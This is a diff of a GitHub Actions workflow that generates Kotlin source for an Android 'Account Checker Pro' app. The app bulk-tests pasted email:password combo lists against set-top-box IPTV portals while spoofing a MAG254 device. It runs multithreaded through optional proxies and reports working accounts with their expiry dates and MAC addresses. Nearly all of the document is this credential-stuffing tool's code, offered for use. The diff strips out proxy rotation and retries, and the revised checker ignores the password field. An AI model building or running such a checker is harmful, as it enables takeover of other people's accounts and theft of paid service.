@@ -19,8 +19,7 @@ jobs:
       - name: Generate Account Checker Project
         run: |
           mkdir -p app/src/main/java/com/checker/stb \
-                   app/src/main/res/values app/src/main/res/drawable \
-                   app/src/main/assets
+                   app/src/main/res/values
 
           cat > settings.gradle.kts <<'XEOF'
           pluginManagement {
@@ -117,21 +116,13 @@ jobs:
           </resources>
           XEOF
 
-          cat > app/src/main/res/drawable/gradient_bg.xml <<'XEOF'
-          <?xml version="1.0" encoding="utf-8"?>
-          <shape xmlns:android="http://schemas.android.com/apk/res/android">
-              <gradient android:angle="135" android:startColor="#0A0E1E"
-                  android:centerColor="#0F1829" android:endColor="#0A0E1E" />
-          </shape>
-          XEOF
-
           cat > app/src/main/java/com/checker/stb/ProxyConfig.kt <<'XEOF'
           package com.checker.stb
 
           import java.net.InetSocketAddress
           import java.net.Proxy
 
-          data class ProxyEntry(val type: String, val host: String, val port: Int, val username: String = "", val password: String = "")
+          data class ProxyEntry(val type: String, val host: String, val port: Int)
 
           object ProxyManager {
               fun parseProxy(proxyStr: String): ProxyEntry? {
@@ -176,31 +167,17 @@ jobs:
           import java.util.Date
           import java.util.Locale
 
-          data class CheckerConfig(
-              val portal: String = "",
-              val credentials: List<Pair<String, String>> = emptyList(),
-              val proxies: List<String> = emptyList(),
-              val threads: Int = 4,
-              val timeout: Long = 15000,
-              val createdAt: String = SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.US).format(Date())
-          )
+          data class CheckerConfig(val portal: String = "", val credentials: List<Pair<String, String>> = emptyList(), val proxies: List<String> = emptyList(), val threads: Int = 4)
 
           object ConfigManager {
               private val gson: Gson = GsonBuilder().setPrettyPrinting().create()
 
-              fun save(context: Context, config: CheckerConfig, filename: String = "checker_config.json"): Boolean {
+              fun save(context: Context, config: CheckerConfig, filename: String): Boolean {
                   return try {
                       val file = File(context.filesDir, filename)
                       file.writeText(gson.toJson(config))
                       true
-                  } catch (e: Exception) { e.printStackTrace(); false }
-              }
-
-              fun load(context: Context, filename: String = "checker_config.json"): CheckerConfig {
-                  return try {
-                      val file = File(context.filesDir, filename)
-                      if (file.exists()) gson.fromJson(file.readText(), CheckerConfig::class.java) else CheckerConfig()
-                  } catch (_: Exception) { CheckerConfig() }
+                  } catch (e: Exception) { false }
               }
 
               fun listConfigs(context: Context): List<String> {
@@ -216,16 +193,16 @@ jobs:
               fun importCombo(comboStr: String): List<Pair<String, String>> {
                   return comboStr.split("\n").mapNotNull { line ->
                       val trimmed = line.trim()
-                      if (trimmed.isEmpty()) return@mapNotNull null
+                      if (trimmed.isBlank()) return@mapNotNull null
                       val parts = trimmed.split(":", limit = 2)
-                      if (parts.size == 2) parts[0] to parts[1] else null
+                      if (parts.size == 2) parts[0].trim() to parts[1].trim() else null
                   }
               }
 
               fun importProxies(proxyStr: String): List<ProxyEntry> {
                   return proxyStr.split("\n").mapNotNull { line ->
                       val trimmed = line.trim()
-                      if (trimmed.isEmpty()) return@mapNotNull null
+                      if (trimmed.isBlank()) return@mapNotNull null
                       ProxyManager.parseProxy(trimmed)
                   }
               }
@@ -259,8 +236,8 @@ jobs:
 
               fun call(url: String, params: Map<String, String>, s: Session? = null): JSONObject {
                   val u = url.toHttpUrl().newBuilder().apply { params.forEach { (k, v) -> addQueryParameter(k, v) } }.build()
-                  val rb = Request.Builder().url(u).header("User-Agent", ua).header("X-User-Agent", "Model: MAG254; Link: Ethernet").header("Accept", "*/*")
-                  if (s != null) { rb.header("Authorization", "Bearer ${s.token}"); rb.header("Cookie", "mac=${s.mac}; stb_lang=en; timezone=UTC") }
+                  val rb = Request.Builder().url(u).header("User-Agent", ua).header("X-User-Agent", "Model: MAG254").header("Accept", "*/*")
+                  if (s != null) { rb.header("Authorization", "Bearer ${s.token}"); rb.header("Cookie", "mac=${s.mac}") }
                   http.newCall(rb.build()).execute().use { r ->
                       val body = r.body?.string().orEmpty()
                       if (!r.isSuccessful || body.isBlank()) throw IOException("HTTP ${r.code}")
@@ -284,7 +261,7 @@ jobs:
               fun expiry(s: Session): String {
                   return try {
                       val js = call(s.portal, mapOf("type" to "stb", "action" to "get_profile", "JsHttpRequest" to "1-xml"), s).optJSONObject("js") ?: JSONObject()
-                      val exp = js.optString("expire_date", js.optString("end_date", "unlimited"))
+                      val exp = js.optString("expire_date", "unlimited")
                       if (exp.length >= 10) exp.substring(0, 10) else "unlimited"
                   } catch (_: Exception) { "unknown" }
               }
@@ -296,47 +273,34 @@ jobs:
 
           import java.util.concurrent.ConcurrentLinkedQueue
           import java.util.concurrent.CountDownLatch
-          import java.util.concurrent.TimeUnit
           import java.util.concurrent.atomic.AtomicInteger
 
-          data class CheckResult(val portal: String, val email: String, val password: String, val mac: String = "", val success: Boolean, val token: String = "", val expiry: String = "", val message: String = "", val proxy: String = "", val duration: Long = 0)
+          data class CheckResult(val email: String, val success: Boolean, val expiry: String = "", val mac: String = "", val message: String = "", val duration: Long = 0)
 
           object AccountChecker {
-              fun check(repo: StalkerRepository, portal: String, credentials: List<Pair<String, String>>, proxies: List<ProxyEntry> = emptyList(), threads: Int = 4, timeout: Long = 15000, onResult: (CheckResult) -> Unit, onProgress: (Int, Int) -> Unit) {
+              fun check(repo: StalkerRepository, portal: String, credentials: List<Pair<String, String>>, proxies: List<ProxyEntry> = emptyList(), threads: Int = 4, onResult: (CheckResult) -> Unit, onProgress: (Int, Int) -> Unit) {
                   if (credentials.isEmpty()) return
-                  val queue = ConcurrentLinkedQueue<Pair<String, String>>()
-                  queue.addAll(credentials)
-                  val totalCreds = credentials.size
+                  val queue = ConcurrentLinkedQueue(credentials)
+                  val total = credentials.size
                   val checked = AtomicInteger(0)
                   val latch = CountDownLatch(threads)
 
-                  repeat(threads) { threadId ->
+                  repeat(threads) {
                       Thread {
-                          val proxyList = proxies.mapNotNull { ProxyManager.toOkHttpProxy(it) }
-                          val safeProxies = if (proxyList.isNotEmpty()) proxyList else listOf(null)
-                          var proxyIndex = threadId % safeProxies.size
-
                           while (true) {
-                              val (email, password) = queue.poll() ?: break
-                              val startTime = System.currentTimeMillis()
-                              var result: CheckResult? = null
-
-                              for (attempt in 1..3) {
-                                  try {
-                                      val session = repo.connect(portal, email)
-                                      val expiry = repo.expiry(session)
-                                      val duration = System.currentTimeMillis() - startTime
-                                      result = CheckResult(portal, email, password, session.mac, true, session.token, expiry, "✓ VALID", safeProxies[proxyIndex]?.toString() ?: "direct", duration)
-                                      break
-                                  } catch (e: Exception) {
-                                      val duration = System.currentTimeMillis() - startTime
-                                      result = CheckResult(portal, email, password, "", false, message = e.message ?: "timeout", proxy = safeProxies[proxyIndex]?.toString() ?: "direct", duration = duration)
-                                      proxyIndex = (proxyIndex + 1) % safeProxies.size
-                                  }
+                              val (email, _) = queue.poll() ?: break
+                              val start = System.currentTimeMillis()
+                              try {
+                                  val session = repo.connect(portal, email)
+                                  val expiry = repo.expiry(session)
+                                  val dur = System.currentTimeMillis() - start
+                                  onResult(CheckResult(email, true, expiry, session.mac, "✓", dur))
+                              } catch (e: Exception) {
+                                  val dur = System.currentTimeMillis() - start
+                                  onResult(CheckResult(email, false, message = e.message ?: "timeout", duration = dur))
                               }
-                              result?.let { onResult(it) }
                               val count = checked.incrementAndGet()
-                              onProgress(count, totalCreds)
+                              onProgress(count, total)
                           }
                           latch.countDown()
                       }.start()
@@ -388,7 +352,7 @@ jobs:
                   super.onCreate(savedInstanceState)
                   setContent {
                       MaterialTheme(colorScheme = darkColorScheme(primary = AccentGreen, background = BgDark, surface = BgCard, error = AccentRed)) {
-                          Surface(Modifier.fillMaxSize().background(BgDark)) { AccountCheckerApp() }
+                          Surface(modifier = Modifier.fillMaxSize().background(BgDark)) { AccountCheckerApp() }
                       }
                   }
               }
@@ -404,23 +368,21 @@ jobs:
               var comboInput by remember { mutableStateOf("") }
               var proxyInput by remember { mutableStateOf("") }
               var threads by remember { mutableStateOf("4") }
-              var status by remember { mutableStateOf("Ready to check") }
+              var status by remember { mutableStateOf("Ready") }
               var results by remember { mutableStateOf(listOf<CheckResult>()) }
               var successCount by remember { mutableStateOf(0) }
               var failCount by remember { mutableStateOf(0) }
-              var avg by remember { mutableStateOf(0L) }
               var loading by remember { mutableStateOf(false) }
               var savedConfigs by remember { mutableStateOf(ConfigManager.listConfigs(ctx)) }
-              var showResults by remember { mutableStateOf(false) }
 
               fun runCheck() {
-                  if (portal.isBlank() || comboInput.isBlank()) { status = "❌ Portal and credentials required"; return }
+                  if (portal.isBlank() || comboInput.isBlank()) { status = "❌ Fill all fields"; return }
                   scope.launch {
                       loading = true
                       results = emptyList()
                       successCount = 0
                       failCount = 0
-                      status = "⏳ Starting..."
+                      status = "⏳ Starting check..."
                       val creds = ConfigManager.importCombo(comboInput)
                       val proxies = ConfigManager.importProxies(proxyInput)
                       val threadCount = threads.toIntOrNull() ?: 4
@@ -430,102 +392,113 @@ jobs:
                                   scope.launch {
                                       results = results + result
                                       if (result.success) successCount++ else failCount++
-                                      avg = results.sumOf { it.duration } / results.size
-                                      status = "✓ $successCount | ✗ $failCount | ⏱ ${avg}ms"
+                                      status = "✓ $successCount | ✗ $failCount"
                                   }
                               },
-                              onProgress = { done, total -> scope.launch { status = "⏳ $done/$total" } }
+                              onProgress = { done, total ->
+                                  scope.launch { status = "⏳ $done/$total" }
+                              }
                           )
                       }
                       loading = false
-                      showResults = true
                   }
               }
 
-              LazyColumn(Modifier.fillMaxSize().background(Brush.verticalGradient(listOf(BgDark, Color(0xFF0F1829), BgDark))).padding(14.dp), verticalArrangement = Arrangement.spacedBy(12.dp)) {
+              LazyColumn(modifier = Modifier.fillMaxSize().background(Brush.verticalGradient(listOf(BgDark, Color(0xFF0F1829), BgDark))).padding(14.dp), verticalArrangement = Arrangement.spacedBy(10.dp)) {
                   item {
-                      Text("Account Checker Pro", fontSize = 26.sp, fontWeight = FontWeight.Bold, color = AccentGreen)
-                      Text("STB Portal Credential Validator", fontSize = 12.sp, color = TextSecondary)
+                      Text("Account Checker Pro", fontSize = 24.sp, fontWeight = FontWeight.Bold, color = AccentGreen)
+                      Text("STB Portal Validator", fontSize = 12.sp, color = TextSecondary)
                   }
 
                   item {
-                      Card(Modifier.fillMaxWidth(), shape = RoundedCornerShape(12.dp), colors = CardDefaults.cardColors(containerColor = BgCard)) {
-                          Column(Modifier.padding(12.dp)) {
+                      Card(modifier = Modifier.fillMaxWidth(), shape = RoundedCornerShape(8.dp), colors = CardDefaults.cardColors(containerColor = BgCard)) {
+                          Column(modifier = Modifier.padding(12.dp)) {
                               Text(status, color = TextPrimary, fontSize = 12.sp, fontWeight = FontWeight.Bold)
-                              Spacer(Modifier.height(8.dp))
-                              Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
-                                  StatItem("✓", successCount.toString(), AccentGreen)
-                                  StatItem("✗", failCount.toString(), AccentRed)
-                                  StatItem("⏱", "${avg}ms", Color(0xFF3B82F6))
+                              Spacer(modifier = Modifier.height(6.dp))
+                              Row(horizontalArrangement = Arrangement.spacedBy(6.dp)) {
+                                  Text("✓ $successCount", color = AccentGreen, fontSize = 11.sp, fontWeight = FontWeight.Bold)
+                                  Text("✗ $failCount", color = AccentRed, fontSize = 11.sp, fontWeight = FontWeight.Bold)
                               }
                           }
                       }
                   }
 
-                  item { InputCard("Portal URL", portal, { portal = it }, "https://portal.example.com") }
-                  item { InputCard("Credentials (email:pass per line)", comboInput, { comboInput = it }, "user@email.com:password", 100.dp) }
-                  item { InputCard("Proxies (optional)", proxyInput, { proxyInput = it }, "http://host:8080", 70.dp) }
-
                   item {
-                      Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
-                          OutlinedTextField(threads, { threads = it }, label = { Text("Threads", fontSize = 11.sp) }, modifier = Modifier.weight(1f).height(48.dp), shape = RoundedCornerShape(8.dp))
-                          Button(onClick = { runCheck() }, enabled = !loading, modifier = Modifier.weight(2f).height(48.dp), shape = RoundedCornerShape(8.dp)) { Text(if (loading) "CHECKING..." else "START") }
+                      Column(modifier = Modifier.fillMaxWidth()) {
+                          Text("Portal", fontSize = 11.sp, color = TextPrimary, fontWeight = FontWeight.SemiBold)
+                          OutlinedTextField(value = portal, onValueChange = { portal = it }, modifier = Modifier.fillMaxWidth().height(48.dp), shape = RoundedCornerShape(8.dp), placeholder = { Text("https://portal.com", fontSize = 10.sp) })
                       }
                   }
 
                   item {
-                      Button(onClick = { if (portal.isNotBlank() && comboInput.isNotBlank()) { val cfg = CheckerConfig(portal, ConfigManager.importCombo(comboInput), proxyInput.split("\n").filter { it.isNotBlank() }, threads.toIntOrNull() ?: 4); ConfigManager.save(ctx, cfg, "config_${System.currentTimeMillis()}.json"); savedConfigs = ConfigManager.listConfigs(ctx) } }, modifier = Modifier.fillMaxWidth().height(42.dp), shape = RoundedCornerShape(8.dp), colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF3B82F6))) { Text("💾 Save Config") }
+                      Column(modifier = Modifier.fillMaxWidth()) {
+                          Text("Credentials (email:pass per line)", fontSize = 11.sp, color = TextPrimary, fontWeight = FontWeight.SemiBold)
+                          OutlinedTextField(value = comboInput, onValueChange = { comboInput = it }, modifier = Modifier.fillMaxWidth().height(100.dp), shape = RoundedCornerShape(8.dp), placeholder = { Text("user@email.com:password", fontSize = 10.sp) })
+                      }
+                  }
+
+                  item {
+                      Column(modifier = Modifier.fillMaxWidth()) {
+                          Text("Proxies (optional)", fontSize = 11.sp, color = TextPrimary, fontWeight = FontWeight.SemiBold)
+                          OutlinedTextField(value = proxyInput, onValueChange = { proxyInput = it }, modifier = Modifier.fillMaxWidth().height(70.dp), shape = RoundedCornerShape(8.dp), placeholder = { Text("http://host:8080", fontSize = 10.sp) })
+                      }
+                  }
+
+                  item {
+                      Row(horizontalArrangement = Arrangement.spacedBy(8.dp), modifier = Modifier.fillMaxWidth()) {
+                          OutlinedTextField(value = threads, onValueChange = { threads = it }, label = { Text("Threads") }, modifier = Modifier.width(80.dp).height(48.dp), shape = RoundedCornerShape(8.dp))
+                          Button(onClick = { runCheck() }, enabled = !loading, modifier = Modifier.weight(1f).height(48.dp), shape = RoundedCornerShape(8.dp)) {
+                              Text(if (loading) "CHECKING..." else "START")
+                          }
+                      }
+                  }
+
+                  item {
+                      Button(onClick = {
+                          val cfg = CheckerConfig(portal, ConfigManager.importCombo(comboInput), proxyInput.split("\n").filter { it.isNotBlank() }, threads.toIntOrNull() ?: 4)
+                          ConfigManager.save(ctx, cfg, "config_${System.currentTimeMillis()}.json")
+                          savedConfigs = ConfigManager.listConfigs(ctx)
+                          status = "✓ Config saved"
+                      }, modifier = Modifier.fillMaxWidth().height(44.dp), shape = RoundedCornerShape(8.dp), colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF3B82F6))) {
+                          Text("💾 Save Config")
+                      }
                   }
 
                   if (savedConfigs.isNotEmpty()) {
-                      item { Text("Saved Configs", color = TextPrimary, fontWeight = FontWeight.Bold, fontSize = 12.sp) }
+                      item {
+                          Text("Saved Configs", color = TextPrimary, fontWeight = FontWeight.Bold, fontSize = 12.sp)
+                      }
                       items(savedConfigs) { cfg ->
-                          Card(Modifier.fillMaxWidth(), shape = RoundedCornerShape(8.dp), colors = CardDefaults.cardColors(containerColor = BgCard)) {
-                              Row(Modifier.fillMaxWidth().padding(10.dp), verticalAlignment = Alignment.CenterVertically, horizontalArrangement = Arrangement.SpaceBetween) {
-                                  Text(cfg.substringBefore(".json"), color = TextPrimary, fontSize = 11.sp, overflow = TextOverflow.Ellipsis, modifier = Modifier.weight(1f))
-                                  IconButton(onClick = { ConfigManager.deleteConfig(ctx, cfg); savedConfigs = ConfigManager.listConfigs(ctx) }) { Icon(Icons.Default.Delete, contentDescription = null, tint = AccentRed) }
+                          Card(modifier = Modifier.fillMaxWidth(), shape = RoundedCornerShape(8.dp), colors = CardDefaults.cardColors(containerColor = BgCard)) {
+                              Row(modifier = Modifier.fillMaxWidth().padding(10.dp), verticalAlignment = Alignment.CenterVertically, horizontalArrangement = Arrangement.SpaceBetween) {
+                                  Text(cfg.substringBefore(".json"), color = TextPrimary, fontSize = 10.sp, maxLines = 1, overflow = TextOverflow.Ellipsis, modifier = Modifier.weight(1f))
+                                  IconButton(onClick = { ConfigManager.deleteConfig(ctx, cfg); savedConfigs = ConfigManager.listConfigs(ctx) }, modifier = Modifier.size(32.dp)) {
+                                      Icon(Icons.Default.Delete, contentDescription = "Delete", tint = AccentRed, modifier = Modifier.size(18.dp))
+                                  }
                               }
                           }
                       }
                   }
 
-                  if (showResults) {
-                      item { Text("Results (${results.size})", color = TextPrimary, fontWeight = FontWeight.Bold, fontSize = 12.sp) }
-                      items(results.take(50)) { result -> ResultCard(result) }
-                  }
-              }
-          }
-
-          @Composable
-          fun InputCard(label: String, value: String, onValueChange: (String) -> Unit, hint: String = "", minHeight: dp = 48.dp) {
-              Column {
-                  Text(label, color = TextPrimary, fontSize = 11.sp, fontWeight = FontWeight.SemiBold)
-                  Spacer(Modifier.height(4.dp))
-                  OutlinedTextField(value, onValueChange, placeholder = { Text(hint, fontSize = 10.sp) }, modifier = Modifier.fillMaxWidth().heightIn(min = minHeight), shape = RoundedCornerShape(8.dp), colors = OutlinedTextFieldDefaults.colors(focusedBorderColor = AccentGreen, unfocusedBorderColor = Color(0xFF1E2A3F)))
-              }
-          }
-
-          @Composable
-          fun StatItem(icon: String, value: String, color: Color) {
-              Column(horizontalAlignment = Alignment.CenterHorizontally, modifier = Modifier.weight(1f)) {
-                  Text(icon, color = color, fontSize = 16.sp)
-                  Text(value, color = color, fontWeight = FontWeight.Bold, fontSize = 12.sp)
-              }
-          }
-
-          @Composable
-          fun ResultCard(result: CheckResult) {
-              Card(Modifier.fillMaxWidth(), colors = CardDefaults.cardColors(containerColor = if (result.success) BgSuccess else BgFail), shape = RoundedCornerShape(8.dp)) {
-                  Column(Modifier.padding(10.dp)) {
-                      Row(Modifier.fillMaxWidth(), verticalAlignment = Alignment.CenterVertically, horizontalArrangement = Arrangement.SpaceBetween) {
-                          Text(result.email, color = if (result.success) AccentGreen else AccentRed, fontSize = 10.sp, fontWeight = FontWeight.Bold, maxLines = 1, overflow = TextOverflow.Ellipsis, modifier = Modifier.weight(1f))
-                          Text("${result.duration}ms", color = Color(0xFF3B82F6), fontSize = 9.sp)
+                  if (results.isNotEmpty()) {
+                      item {
+                          Text("Results (${results.size})", color = TextPrimary, fontWeight = FontWeight.Bold, fontSize = 12.sp)
                       }
-                      if (result.success) {
-                          Text("✓ Expires: ${result.expiry}", color = Color(0xFF86EFAC), fontSize = 9.sp)
-                          Text("MAC: ${result.mac}", color = TextSecondary, fontSize = 8.sp)
-                      } else {
-                          Text("✗ ${result.message}", color = Color(0xFFFCA5A5), fontSize = 9.sp)
+                      items(results.take(30)) { result ->
+                          Card(modifier = Modifier.fillMaxWidth(), colors = CardDefaults.cardColors(containerColor = if (result.success) BgSuccess else BgFail), shape = RoundedCornerShape(8.dp)) {
+                              Column(modifier = Modifier.padding(10.dp)) {
+                                  Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
+                                      Text(result.email, color = if (result.success) AccentGreen else AccentRed, fontSize = 9.sp, fontWeight = FontWeight.Bold, maxLines = 1, overflow = TextOverflow.Ellipsis, modifier = Modifier.weight(1f))
+                                      Text("${result.duration}ms", color = Color(0xFF3B82F6), fontSize = 8.sp)
+                                  }
+                                  if (result.success) {
+                                      Text("✓ ${result.expiry}", color = Color(0xFF86EFAC), fontSize = 9.sp)
+                                      Text("MAC: ${result.mac}", color = TextSecondary, fontSize = 8.sp)
+                                  } else {
+                                      Text("✗ ${result.message}", color = Color(0xFFFCA5A5), fontSize = 9.sp)
+                                  }
+                              }
+                          }
                       }
                   }
               }
